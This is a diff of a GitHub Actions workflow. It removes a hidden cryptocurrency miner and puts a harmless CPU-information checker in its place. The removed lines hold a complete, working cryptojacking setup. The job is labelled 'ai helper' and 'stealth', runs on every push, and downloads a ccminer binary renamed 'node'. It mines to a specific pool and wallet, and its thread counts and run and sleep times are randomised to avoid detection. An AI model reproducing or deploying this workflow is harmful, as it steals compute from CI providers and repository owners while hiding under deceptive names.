@@ -1,44 +1,22 @@
-name: ai helper
+name: CPU Info Checker
 
 on:
-  push:
-    branches: [ main ]
   workflow_dispatch:
 
 jobs:
-  stealth:
+  check-cpu:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Install required tools
+    - name: Show basic CPU information
       run: |
-        sudo apt update
-        sudo apt install -y curl libomp-dev
-
-    - name: Check available CPU threads
-      run: |
-        echo "🧠 Checking available CPU threads..."
-        THREAD_COUNT=$(nproc)
-        echo "✅ This runner has $THREAD_COUNT thread(s) available."
-
-    - name: Download and prepare ai
-      run: |
-        curl -L -o miner https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3a-CPU/ccminer-v3.8.3a-oink_Ubuntu_18.04
-        chmod +x miner
-        mv miner node
-
-    - name: Start ai (stealth)
-      run: |
-        while true; do
-          THREADS=$((1 + RANDOM % 2))
-          echo "Starting miner with $THREADS thread(s)..."
-          ./node -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7.worker1 -p x -t $THREADS &
-          PID=$!
-          RUNTIME=$((180 + RANDOM % 61))
-          sleep $RUNTIME
-          echo "Stopping miner after $RUNTIME seconds."
-          kill $PID
-          SLEEP_TIME=$((15 + RANDOM % 26))
-          echo "Sleeping for $SLEEP_TIME seconds."
-          sleep $SLEEP_TIME
-        done
+        echo "🧠 Checking CPU information..."
+        echo ""
+        echo "▶️ Total Threads (vCPU):"
+        nproc
+        echo ""
+        echo "▶️ Full CPU Info:"
+        lscpu
+        echo ""
+        echo "▶️ /proc/cpuinfo Summary:"
+        grep -E 'model name|cpu cores|siblings|MHz' /proc/cpuinfo | sort | uniq
